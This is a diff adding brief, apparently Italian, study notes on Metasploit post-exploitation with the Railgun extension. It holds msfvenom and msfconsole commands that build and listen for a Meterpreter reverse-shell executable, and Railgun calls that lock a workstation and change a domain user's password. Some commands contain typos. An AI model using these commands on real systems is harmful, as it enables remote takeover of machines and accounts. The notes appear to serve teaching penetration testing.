@@ -1,0 +1,26 @@
+https://www.defcon.org/images/defcon-20/dc-20-presentations/Maloney/DEFCON-20-Maloney-Railgun.pdf
+https://www.youtube.com/watch?v=mt2JoYkhmOA
+https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/nf-lmaccess-netuserchangepassword
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lport 8888
+ser rhost x.x.x.x
+
+
+msfvenom -p windows/meterpreter/reverse_tcp PORT=8888 -f exe > knx.exe
+knx.exe
+
+irb
+session.railgun
+session.railgun.known_dll_names
+session.railgun.<dllname>.functions
+session.railgun.user32.functions.each_pair {|n, v| puts "Function name: #{n}, Returns: #{v.return_type}, Params: #{v.params}"}
+
+session.railgun.user32.MessageBoxA(0, "hello, world", "hello", "MB_OK")
+
+
+ESERCIZIO X CASA:
+client.railgun.user32.LockWorkStation()
+session.railgun.netapi32.NetUserChangePassword("dominio", "utente", "password_Attuale", "password_nuova")
